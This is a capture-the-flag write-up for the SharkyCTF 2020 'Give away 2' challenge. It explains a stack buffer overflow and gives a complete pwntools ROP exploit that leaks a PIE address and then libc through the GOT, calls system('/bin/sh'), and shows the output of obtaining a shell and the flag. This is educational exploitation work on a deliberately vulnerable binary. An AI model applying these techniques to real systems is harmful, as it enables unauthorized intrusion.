# SharkyCTF 2020

## Give away 2

>293
>
> Make good use of this gracious give away.
>
> `nc sharkyctf.xyz 20335`
>
> Creator: Hackhim
>
> [`give_away_1`](give_away_2) [`libc-2.27.so`](libc-2.27.so)

Tags: _pwn_ _bof_ _x86-64_ _rop_


## Summary

Overflow buffer; `main` address leak, followed by libc leak, and then a shell.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No canary; buffer overflow vulnerability.

    
### Decompile with Ghidra

```c
undefined8 main(void)

{
  init_buffering();
  printf("Give away: %p\n",main);
  vuln();
  return 0;
}
```

Address of `main` leaked.  However, with PIE/ASLR and no `win` function, we'll have to leak libc ourselves and call `vuln` for a 2nd pass.

```c
void vuln(void)

{
  char local_28 [32];
  
  fgets(local_28,0x80,stdin);
  return;
}
```

`32` != `0x80` (128).  A roomy vulnerability.

`local_28` is `0x28` bytes above the return address.


## Exploit

### First Pass

```python
#!/usr/bin/python3

from pwn import *

p = process('./give_away_2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = remote('sharkyctf.xyz', 20335)
#libc = ELF('libc-2.27.so')

context.clear(arch='amd64')

p.recvuntil('Give away: ')
main = int(p.recvline().strip(),16)

binary = ELF('./give_away_2')
procbase = main - binary.symbols['main']
print('procbase: ' + hex(procbase))

rop = ROP('./give_away_2')
try:
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
    print('pop_rdi: ' + hex(pop_rdi + procbase))
except:
    print("no ROP for you!")
    sys.exit(1)

payload  = 0x28 * b'A'
payload += p64(procbase + pop_rdi + 1)
payload += p64(procbase + pop_rdi)
payload += p64(procbase + binary.got['printf'])
payload += p64(procbase + binary.plt['printf'])
payload += p64(procbase + binary.symbols['vuln'])

# check load
if payload.find(b'\xa0') != -1:
    print("payload has NL!")
    print(payload)
    sys.exit(1)

p.sendline(payload)
```

> The extra `ret` (`payload += p64(procbase + pop_rdi + 1)`) is required to align the stack, see [Blind Piloting](https://github.com/datajerk/ctf-write-ups/blob/master/b01lersctf2020/blind-piloting/README.md) for a lengthly example and explanation.

The first pass will collect the leaked `main` and compute base process address, with that + GOT we can leak the address of `printf` by having `printf` emit its own address.

Lastly, we have to return back to `vuln` for the second pass.


### Second Pass

```python
printf=u64(p.recv(6)+b'\x00\x00')
libcbase = printf - libc.symbols['printf']
print("libcbase: " + hex(libcbase))

payload  = 0x28 * b'A'
payload += p64(procbase + pop_rdi)
payload += p64(libcbase + next(libc.search(b"/bin/sh")))
payload += p64(libcbase + libc.symbols['system'])

# check load
if payload.find(b'\xa0') != -1:
    print("payload has NL!")
    print(payload)
    sys.exit(1)

p.sendline(payload)
p.interactive()
```

With address of `printf` leaked, computing the base of libc is trivial.

The new payload just pops the address of `/bin/sh` off the stack and calls `system` for a shell.

Output:

```
# ./exploit.py
[+] Opening connection to sharkyctf.xyz on port 20335: Done
[*] '/pwd/datajerk/sharkyctf2020/giveaway2/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/sharkyctf2020/giveaway2/give_away_2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
procbase: 0x564a0f699000
[*] Loading gadgets for '/pwd/datajerk/sharkyctf2020/giveaway2/give_away_2'
pop_rdi: 0x564a0f699903
libcbase: 0x7fe5d4cac000
[*] Switching to interactive mode
$ cat flag.txt
shkCTF{It's_time_to_get_down_to_business}
```
